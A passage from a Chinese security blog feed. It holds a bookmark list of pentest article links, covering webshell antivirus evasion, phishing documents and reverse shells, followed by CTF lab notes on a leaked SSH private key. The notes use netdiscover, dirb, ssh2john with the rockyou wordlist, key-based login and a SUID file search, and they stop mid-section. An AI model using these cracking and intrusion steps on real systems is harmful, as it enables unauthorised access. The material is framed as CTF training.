        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在学习的过程中，会经常浏览一些优质的公众号和论坛文章，但是可能看看以后就过去了，下次在想找的时候就找不到了，为了解决这个问题，我决定自己将一些自己决定还不错的问题记录下来。方便下次查看，同时也能方便他人查看。</p><a id="more"></a><h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><h2 id="1-1-Bypass-CDN"><a href="#1-1-Bypass-CDN" class="headerlink" title="1.1 Bypass CDN"></a>1.1 Bypass CDN</h2><p><a href="https://www.secshi.com/gongju/%E6%9C%80%E5%90%8E%E7%9A%84bypass-cdn-%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip.html" target="_blank" rel="noopener">https://www.secshi.com/gongju/%E6%9C%80%E5%90%8E%E7%9A%84bypass-cdn-%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip.html</a></p><p><a href="https://mp.weixin.qq.com/s/JoE4Y0amhsznx10OtmuCxg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/JoE4Y0amhsznx10OtmuCxg</a></p><h2 id="1-1-记一次另类突破CDN的完全渗透"><a href="#1-1-记一次另类突破CDN的完全渗透" class="headerlink" title="1.1 记一次另类突破CDN的完全渗透"></a>1.1 记一次另类突破CDN的完全渗透</h2><p><a href="http://www.recorday.cn/index.php/2018/10/17/pentest_bypass_cdn/" target="_blank" rel="noopener">http://www.recorday.cn/index.php/2018/10/17/pentest_bypass_cdn/</a></p><h2 id="1-2-Android-APK脱壳–腾讯乐固、360加固一键脱壳"><a href="#1-2-Android-APK脱壳–腾讯乐固、360加固一键脱壳" class="headerlink" title="1.2 Android APK脱壳–腾讯乐固、360加固一键脱壳"></a>1.2 Android APK脱壳–腾讯乐固、360加固一键脱壳</h2><p><a href="https://www.jianshu.com/p/138c9de2c987" target="_blank" rel="noopener">https://www.jianshu.com/p/138c9de2c987</a></p><h2 id="1-3-反弹shell的学习总结-01"><a href="#1-3-反弹shell的学习总结-01" class="headerlink" title="1.3 反弹shell的学习总结-01"></a>1.3 反弹shell的学习总结-01</h2><p><a href="https://mp.weixin.qq.com/s/-citnkfwGai7KQCIp9G99w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-citnkfwGai7KQCIp9G99w</a></p><h2 id="1-4-反弹shell的学习总结-02"><a href="#1-4-反弹shell的学习总结-02" class="headerlink" title="1.4 反弹shell的学习总结-02"></a>1.4 反弹shell的学习总结-02</h2><p><a href="https://mp.weixin.qq.com/s/S9Luvf2Drj4aDqKWUJjTwg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/S9Luvf2Drj4aDqKWUJjTwg</a></p><h2 id="1-5-使用BurpSuite宏获取CSRF-TOKEN"><a href="#1-5-使用BurpSuite宏获取CSRF-TOKEN" class="headerlink" title="1.5 使用BurpSuite宏获取CSRF TOKEN"></a>1.5 使用BurpSuite宏获取CSRF TOKEN</h2><p><a href="https://ryaninf.github.io/2019/07/15/使用BurpSuite宏获取CSRF-TOKEN/" target="_blank" rel="noopener">https://ryaninf.github.io/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/</a></p><h2 id="1-6-谈谈php一句话木马的免杀"><a href="#1-6-谈谈php一句话木马的免杀" class="headerlink" title="1.6 谈谈php一句话木马的免杀"></a>1.6 谈谈php一句话木马的免杀</h2><p><a href="https://saucer-man.com/information_security/248.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/248.html</a></p><h2 id="1-7-Web安全攻防-01"><a href="#1-7-Web安全攻防-01" class="headerlink" title="1.7 Web安全攻防:01"></a>1.7 Web安全攻防:01</h2><p><a href="https://blog.csdn.net/qq_41453285/article/details/94888750" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/94888750</a></p><h2 id="1-8-安全大会资料"><a href="#1-8-安全大会资料" class="headerlink" title="1.8 安全大会资料"></a>1.8 安全大会资料</h2><p><a href="https://www.hackinn.com/index.php/archives/492/" target="_blank" rel="noopener">https://www.hackinn.com/index.php/archives/492/</a></p><h2 id="1-9-个人年度总结及AWD线下赛复盘"><a href="#1-9-个人年度总结及AWD线下赛复盘" class="headerlink" title="1.9 个人年度总结及AWD线下赛复盘"></a>1.9 个人年度总结及AWD线下赛复盘</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484891&amp;idx=1&amp;sn=c767bb774c3817ebfccdbb9bdcec4255&amp;chksm=fc974ccacbe0c5dc7018a58ab7cad811b1c0fd8b5b63cf8d448eb1848d8ad307cc11f6b52d50&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1568818208564&amp;sharer_shareid=2fb4b0da16cbda243011c5424b7ee1d8&amp;key=5b405373aa09951d5175a541d875b688d014322753c6ad9ceabfaeaa4f0917e3589dbfe9abc1d6134cdcf069c7210c1e316d1237cd15e0ea8b793e2bf4086b7374f664c2de0b79e40f274869759b7679&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=tmZFm2SQBQxsTJpizTvPQ6G11qxs5HdnP9XAuBoHvQgVZOE6cowZMw47%2B2TG3bKU" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484891&amp;idx=1&amp;sn=c767bb774c3817ebfccdbb9bdcec4255&amp;chksm=fc974ccacbe0c5dc7018a58ab7cad811b1c0fd8b5b63cf8d448eb1848d8ad307cc11f6b52d50&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1568818208564&amp;sharer_shareid=2fb4b0da16cbda243011c5424b7ee1d8&amp;key=5b405373aa09951d5175a541d875b688d014322753c6ad9ceabfaeaa4f0917e3589dbfe9abc1d6134cdcf069c7210c1e316d1237cd15e0ea8b793e2bf4086b7374f664c2de0b79e40f274869759b7679&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=tmZFm2SQBQxsTJpizTvPQ6G11qxs5HdnP9XAuBoHvQgVZOE6cowZMw47%2B2TG3bKU</a></p><h2 id="1-10-burpsuite使用技巧"><a href="#1-10-burpsuite使用技巧" class="headerlink" title="1.10 burpsuite使用技巧"></a>1.10 burpsuite使用技巧</h2><p><a href="https://www.cnblogs.com/wanghaihong200/p/8727450.html" target="_blank" rel="noopener">https://www.cnblogs.com/wanghaihong200/p/8727450.html</a></p><h2 id="1-11-如何成为一个漏洞赏金猎人"><a href="#1-11-如何成为一个漏洞赏金猎人" class="headerlink" title="1.11 如何成为一个漏洞赏金猎人"></a>1.11 如何成为一个漏洞赏金猎人</h2><p><a href="https://xz.aliyun.com/t/2701" target="_blank" rel="noopener">https://xz.aliyun.com/t/2701</a></p><h2 id="1-12-绕过360进行Word文档钓鱼"><a href="#1-12-绕过360进行Word文档钓鱼" class="headerlink" title="1.12 绕过360进行Word文档钓鱼"></a>1.12 绕过360进行Word文档钓鱼</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487417&amp;idx=1&amp;sn=3c6723d503e868ad45441141208cbf53&amp;chksm=ec1f5a86db68d390e23cee1bd44fa6b27838eb345d13b6b7a1337fa02e0c14cb0f9e98a5aa3d&amp;scene=0&amp;xtrack=1&amp;key=f81bb8c63413c3b3c095879c3ba17c47b1cdd53509ba07ad47b8024c505b3a7d5d2b1625aa10948316860ec42b1a14df6f900f281488992ce8558d2424ca32505471a06da548c52f3636af57c14b63a6&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487417&amp;idx=1&amp;sn=3c6723d503e868ad45441141208cbf53&amp;chksm=ec1f5a86db68d390e23cee1bd44fa6b27838eb345d13b6b7a1337fa02e0c14cb0f9e98a5aa3d&amp;scene=0&amp;xtrack=1&amp;key=f81bb8c63413c3b3c095879c3ba17c47b1cdd53509ba07ad47b8024c505b3a7d5d2b1625aa10948316860ec42b1a14df6f900f281488992ce8558d2424ca32505471a06da548c52f3636af57c14b63a6&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae</a></p><h2 id="1-13-利用DOCX文档远程模板注入执行宏"><a href="#1-13-利用DOCX文档远程模板注入执行宏" class="headerlink" title="1.13 利用DOCX文档远程模板注入执行宏"></a>1.13 利用DOCX文档远程模板注入执行宏</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487401&amp;idx=1&amp;sn=55821cd34f91e44b5b95934878f8430b&amp;chksm=ec1f5a96db68d3807e3dc359870e30ef68cdca47ba206b3d7788d91ec57b98576586e99f5bea&amp;scene=0&amp;xtrack=1&amp;key=8d3f7565c056ebe6148ab33bf8049f7ac27373f5482b6af07747a3291d4a6ac3923d4d5ed2486cae5a0a7a4ad81c97ae0a011d877b3ce747e9372a29dea6ce2d6f6bf92da5887da6cb45c931ccb46608&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487401&amp;idx=1&amp;sn=55821cd34f91e44b5b95934878f8430b&amp;chksm=ec1f5a96db68d3807e3dc359870e30ef68cdca47ba206b3d7788d91ec57b98576586e99f5bea&amp;scene=0&amp;xtrack=1&amp;key=8d3f7565c056ebe6148ab33bf8049f7ac27373f5482b6af07747a3291d4a6ac3923d4d5ed2486cae5a0a7a4ad81c97ae0a011d877b3ce747e9372a29dea6ce2d6f6bf92da5887da6cb45c931ccb46608&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae</a></p><h2 id="1-14-从-SQL-Server-注入到-getshell"><a href="#1-14-从-SQL-Server-注入到-getshell" class="headerlink" title="1.14 从 SQL Server 注入到 getshell"></a>1.14 从 SQL Server 注入到 getshell</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU2MjM4NDYxOQ==&amp;mid=2247484520&amp;idx=1&amp;sn=c7de3e567ba28a1e2c4553a4cfc4dbc1&amp;chksm=fc6b1feccb1c96fa0780dff20c8ea1599067f02df6e9daa4694a76cb54834525e56e64877577&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569823777394&amp;sharer_shareid=498525f2ce1126969b23a1b6297670ed#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU2MjM4NDYxOQ==&amp;mid=2247484520&amp;idx=1&amp;sn=c7de3e567ba28a1e2c4553a4cfc4dbc1&amp;chksm=fc6b1feccb1c96fa0780dff20c8ea1599067f02df6e9daa4694a76cb54834525e56e64877577&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569823777394&amp;sharer_shareid=498525f2ce1126969b23a1b6297670ed#rd</a></p><h2 id="1-15-某CMS最新版本测试全过程（前台Getshell）"><a href="#1-15-某CMS最新版本测试全过程（前台Getshell）" class="headerlink" title="1.15 某CMS最新版本测试全过程（前台Getshell）"></a>1.15 某CMS最新版本测试全过程（前台Getshell）</h2><h2 id="https-xz-aliyun-com-t-3767-toc-4"><a href="#https-xz-aliyun-com-t-3767-toc-4" class="headerlink" title="https://xz.aliyun.com/t/3767#toc-4"></a><a href="https://xz.aliyun.com/t/3767#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3767#toc-4</a></h2><h2 id="1-16-CTF-学习笔记-04"><a href="#1-16-CTF-学习笔记-04" class="headerlink" title="1.16 CTF 学习笔记 04"></a>1.16 CTF 学习笔记 04</h2><p><a href="https://www.codetd.com/article/1625703" target="_blank" rel="noopener">https://www.codetd.com/article/1625703</a></p><h2 id="1-17-SRC漏洞挖掘实用技巧"><a href="#1-17-SRC漏洞挖掘实用技巧" class="headerlink" title="1.17  SRC漏洞挖掘实用技巧"></a>1.17  SRC漏洞挖掘实用技巧</h2><p><a href="https://mp.weixin.qq.com/s/g-vlNmn4uQKUnBKZ7LMJvA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/g-vlNmn4uQKUnBKZ7LMJvA</a></p><h2 id="1-18-SRC漏洞挖掘经验-技巧篇"><a href="#1-18-SRC漏洞挖掘经验-技巧篇" class="headerlink" title="1.18 SRC漏洞挖掘经验+技巧篇"></a>1.18 SRC漏洞挖掘经验+技巧篇</h2><p><a href="https://www.secshi.com/gongju/2150.html" target="_blank" rel="noopener">https://www.secshi.com/gongju/2150.html</a></p><h2 id="1-19-CTF入门宝典-CTF五大题型之杂项那些事儿"><a href="#1-19-CTF入门宝典-CTF五大题型之杂项那些事儿" class="headerlink" title="1.19 CTF入门宝典|CTF五大题型之杂项那些事儿"></a>1.19 CTF入门宝典|CTF五大题型之杂项那些事儿</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4NTE4NDAyNA==&amp;mid=2650381966&amp;idx=1&amp;sn=4f0f31cb1ae72ee121bad54fa987ef9f&amp;chksm=f3fd27f9c48aaeefeaacfbe0e603edf43b8ba104fb8b94e9d0c88e7525c7d0419525a6c62c95&amp;scene=0&amp;xtrack=1&amp;key=414f02a75cddb369686f6a66bb3266c429d9c75fa933" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI4NTE4NDAyNA==&amp;mid=2650381966&amp;idx=1&amp;sn=4f0f31cb1ae72ee121bad54fa987ef9f&amp;chksm=f3fd27f9c48aaeefeaacfbe0e603edf43b8ba104fb8b94e9d0c88e7525c7d0419525a6c62c95&amp;scene=0&amp;xtrack=1&amp;key=414f02a75cddb369686f6a66bb3266c429d9c75fa933</a></p><h2 id="1-20-经过一场面试，我发现我还存在这些不足"><a href="#1-20-经过一场面试，我发现我还存在这些不足" class="headerlink" title="1.20 经过一场面试，我发现我还存在这些不足"></a>1.20 经过一场面试，我发现我还存在这些不足</h2><p><a href="http://teamssix.com/year/191014-090745.html" target="_blank" rel="noopener">http://teamssix.com/year/191014-090745.html</a></p><h2 id="1-21-基于AWD比赛的蠕虫webshell"><a href="#1-21-基于AWD比赛的蠕虫webshell" class="headerlink" title="1.21 基于AWD比赛的蠕虫webshell"></a>1.21 基于AWD比赛的蠕虫webshell</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652852251&amp;idx=1&amp;sn=13c0e0b7e538ac9ebb43bdd9fe5a3bf4&amp;chksm=bd592cd68a2ea5c0658e1883e9e49abe90013b820bbfa0322c65a81ffee44ec89a6a0daaf737&amp;scene=0&amp;xtrack=1&amp;key=5b405373aa09951dc5f3f4c4aa046f264a10686e80568229a65b875895fe24653c58ed5f8a2c5d8766fa5890837ea79cc1b4909cc7e71fc902e3f5f20af5d75a3228551d87201bae6a9d018cf9c5629a&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=6207014a&amp;lang=zh_CN&amp;pass_ticket=72AWbUacIhSrbPgUEQHLHVBY1OluXkWbxHb1HmZjsuDwVov9X1ZSTEuMhgtcK3jA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652852251&amp;idx=1&amp;sn=13c0e0b7e538ac9ebb43bdd9fe5a3bf4&amp;chksm=bd592cd68a2ea5c0658e1883e9e49abe90013b820bbfa0322c65a81ffee44ec89a6a0daaf737&amp;scene=0&amp;xtrack=1&amp;key=5b405373aa09951dc5f3f4c4aa046f264a10686e80568229a65b875895fe24653c58ed5f8a2c5d8766fa5890837ea79cc1b4909cc7e71fc902e3f5f20af5d75a3228551d87201bae6a9d018cf9c5629a&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=6207014a&amp;lang=zh_CN&amp;pass_ticket=72AWbUacIhSrbPgUEQHLHVBY1OluXkWbxHb1HmZjsuDwVov9X1ZSTEuMhgtcK3jA</a></p><h2 id="1-22-基于AWD比赛的蠕虫webshell-二"><a href="#1-22-基于AWD比赛的蠕虫webshell-二" class="headerlink" title="1.22 基于AWD比赛的蠕虫webshell(二)"></a>1.22 基于AWD比赛的蠕虫webshell(二)</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652852308&amp;idx=1&amp;sn=dbc6ed5539e9eacbf74b75667f51dd7f&amp;chksm=bd592c998a2ea58f34eb926c0d5fe9f5a561eeb67fa06b4593669513ddd480292439fb0be8d5&amp;scene=0&amp;xtrack=1&amp;key=56629d78eb0c25e490a8b72a7cc6688351eefe7d2b278177d7ecd371371e37bfae2a4efa2e7f88ff4518eb5c0f8a092695c9e96412b23bec296b95416d64fa9925d5e1f7f17a071c738efa52c0b54648&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=6207014a&amp;lang=zh_CN&amp;pass_ticket=72AWbUacIhSrbPgUEQHLHVBY1OluXkWbxHb1HmZjsuDwVov9X1ZSTEuMhgtcK3jA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652852308&amp;idx=1&amp;sn=dbc6ed5539e9eacbf74b75667f51dd7f&amp;chksm=bd592c998a2ea58f34eb926c0d5fe9f5a561eeb67fa06b4593669513ddd480292439fb0be8d5&amp;scene=0&amp;xtrack=1&amp;key=56629d78eb0c25e490a8b72a7cc6688351eefe7d2b278177d7ecd371371e37bfae2a4efa2e7f88ff4518eb5c0f8a092695c9e96412b23bec296b95416d64fa9925d5e1f7f17a071c738efa52c0b54648&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=6207014a&amp;lang=zh_CN&amp;pass_ticket=72AWbUacIhSrbPgUEQHLHVBY1OluXkWbxHb1HmZjsuDwVov9X1ZSTEuMhgtcK3jA</a></p><h2 id="1-23-社会工程学-钓鱼攻击"><a href="#1-23-社会工程学-钓鱼攻击" class="headerlink" title="1.23 社会工程学-钓鱼攻击"></a>1.23 社会工程学-钓鱼攻击</h2><p><a href="https://www.secshi.com/jiaocheng/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6-%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">https://www.secshi.com/jiaocheng/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6-%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.html</a></p><h2 id="1-24-从锐捷某系统鸡肋XSS到通用WAF绕过"><a href="#1-24-从锐捷某系统鸡肋XSS到通用WAF绕过" class="headerlink" title="1.24 从锐捷某系统鸡肋XSS到通用WAF绕过"></a>1.24 从锐捷某系统鸡肋XSS到通用WAF绕过</h2><p><a href="https://xz.aliyun.com/t/6733" target="_blank" rel="noopener">https://xz.aliyun.com/t/6733</a></p><h1 id="0x02-移动安全"><a href="#0x02-移动安全" class="headerlink" title="0x02  移动安全"></a>0x02  移动安全</h1><p>安卓应用安全学习</p><h2 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h2><p>Drozer 安装和使用</p><p><a href="https://www.jianshu.com/p/168cdd3daa1d" target="_blank" rel="noopener">https://www.jianshu.com/p/168cdd3daa1d</a></p><p>Metasploit 安装和使用</p><p><a href="https://www.jianshu.com/p/e63006a24603" target="_blank" rel="noopener">https://www.jianshu.com/p/e63006a24603</a></p><p>Frida 安装和使用</p><p><a href="https://www.jianshu.com/p/bab4f4714d98" target="_blank" rel="noopener">https://www.jianshu.com/p/bab4f4714d98</a></p><p>Xposed</p><p><a href="http://www.520monkey.com/archives/895" target="_blank" rel="noopener">http://www.520monkey.com/archives/895</a></p><p>Cydia</p><p><a href="http://www.520monkey.com/archives/1028" target="_blank" rel="noopener">http://www.520monkey.com/archives/1028</a></p><p>移动安全入门指南</p><p><a href="https://shuwoom.com/?p=893" target="_blank" rel="noopener">https://shuwoom.com/?p=893</a></p><p>权限维持工具</p><p><a href="https://mp.weixin.qq.com/s/KdIoPRR8XQPNuRIW3HKoQg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KdIoPRR8XQPNuRIW3HKoQg</a></p><p>XML外部实体注入</p><p><a href="https://xz.aliyun.com/t/6754" target="_blank" rel="noopener">https://xz.aliyun.com/t/6754</a></p><h1 id="0x03-优秀好文"><a href="#0x03-优秀好文" class="headerlink" title="0x03 优秀好文"></a>0x03 优秀好文</h1><h2 id="3-1-公众号运营"><a href="#3-1-公众号运营" class="headerlink" title="3.1 公众号运营"></a>3.1 公众号运营</h2><p><a href="https://www.zhihu.com/question/40636150/answer/826537735" target="_blank" rel="noopener">https://www.zhihu.com/question/40636150/answer/826537735</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 优秀文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF夺旗培训学习笔记</title>
      <link href="/2019/08/31/CTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/08/31/CTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>由于公司要派我和其他几个同事一起代表公司去参加一场CTF比赛，所以，就在网上找了一些资料来学习，在这里简单做下学习笔记。</p><a id="more"></a><h1 id="0x01-CTF简介"><a href="#0x01-CTF简介" class="headerlink" title="0x01 CTF简介"></a>0x01 CTF简介</h1><p>CTF是一-种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”, 也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式,率先从主办方给出的比赛环境中得到一-串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag”</p><p> CTF比赛中涉及内容比较繁杂，我们要利用所有可以利用的方法获得flag。</p><p>CTF比赛中，比赛环境有两种方式：<br>1.给与在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击机，通过攻击机来渗透靶场机器，获取对应的Flag值；（一般情况下给与kali Linux作为攻击机，并且举办方提供计算机）<br>2.给与一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机器，过去对应的flag值。</p><h1 id="0x02-CTF夺旗之SSH私钥泄露"><a href="#0x02-CTF夺旗之SSH私钥泄露" class="headerlink" title="0x02 CTF夺旗之SSH私钥泄露"></a>0x02 CTF夺旗之SSH私钥泄露</h1><h2 id="2-1-前期准备"><a href="#2-1-前期准备" class="headerlink" title="2.1 前期准备"></a>2.1 前期准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r ip/network  # 发现主机</span><br><span class="line">ping ip   #测试连通性</span><br></pre></td></tr></table></figure><h2 id="2-2-信息探测"><a href="#2-2-信息探测" class="headerlink" title="2.2 信息探测"></a>2.2 信息探测</h2><p>每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023端口，在扫描结果中查找特殊端口，针对特殊端口进行探测，尤其对开放大端口的<code>http</code>服务进行排查</p><h2 id="2-4-探测大端口的信息"><a href="#2-4-探测大端口的信息" class="headerlink" title="2.4 探测大端口的信息"></a>2.4 探测大端口的信息</h2><p>对于开放<code>http</code>服务的大端口，可以采取<a href="http://ip:port/的形式访问。" target="_blank" rel="noopener">http://ip:port/的形式访问。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140123.png" class="lozad"></p><p>查看源代码获取对应信息，如果没有falg信息，使用工具探测隐藏页面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://ip：port/  #对这个服务的隐藏文件进行探测。</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140139.png" class="lozad"></p><p>发现robots.txt敏感文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140232.png" class="lozad"></p><p>进一步对得到的信息进行探测</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140242.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140310.png" class="lozad"></p><h2 id="2-5-针对隐藏页面分析"><a href="#2-5-针对隐藏页面分析" class="headerlink" title="2.5 针对隐藏页面分析"></a>2.5 针对隐藏页面分析</h2><p>直接使用浏览器访问，查看效果，对应源代码，可能会获取到flag，或者下一步对应的提示；<br>挖掘ssh信息，不断访问获取更多泄露的ssh秘钥信息<br>下载id_ras,和authorized keys</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140621.png" class="lozad"></p><p>查看下载的两个秘钥文件信息,尝试使用秘钥登陆未能成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831140635.png" class="lozad"></p><p>给id_rsa赋予读写权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141109.png" class="lozad"></p><blockquote><p>说明：600 == 110 000 000 == rw- — —</p></blockquote><h2 id="2-6-解密ssh秘钥信息"><a href="#2-6-解密ssh秘钥信息" class="headerlink" title="2.6 解密ssh秘钥信息"></a>2.6 解密ssh秘钥信息</h2><p>使用<code>ssh2john</code>将<code>id_isa</code>秘钥信息转换为<code>john</code>可以识别的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_isa</span><br><span class="line">ssh2john id_isa &gt; isacrack</span><br></pre></td></tr></table></figure><p>利用字典解密<code>isacrack</code>信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe -rules isacrack</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141556.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141644.png" class="lozad"></p><p>分析用户名、利用ssh登陆服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_isa 用户名@ssh靶场机器IP地址</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141656.png" class="lozad"></p><p>到这里已经登陆到主机，但是并不是root权限，该如何获取root权限尼？<br>答：深入探测根目录-</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831141919.png" class="lozad"></p><p>查找具有root权限的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / - perm -4000 2 &gt; /dev/null</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142006.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142025.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142122.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190831142142.png" class="lozad"></p><h1 id="0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限"><a href="#0x03-CTF夺旗之SSH服务渗透-拿到第一个用户权限" class="headerlink" title="0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)"></a>0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)</h1><h2 id="3-1-ssh协议介绍"><a href="#3-1-ssh协议介绍" class="headerlink" title="3.1 ssh协议介绍"></a>3.1 ssh协议介绍</h2><p>SSH 未Secure Shell的缩写，有IETF的网络小组（Network Working 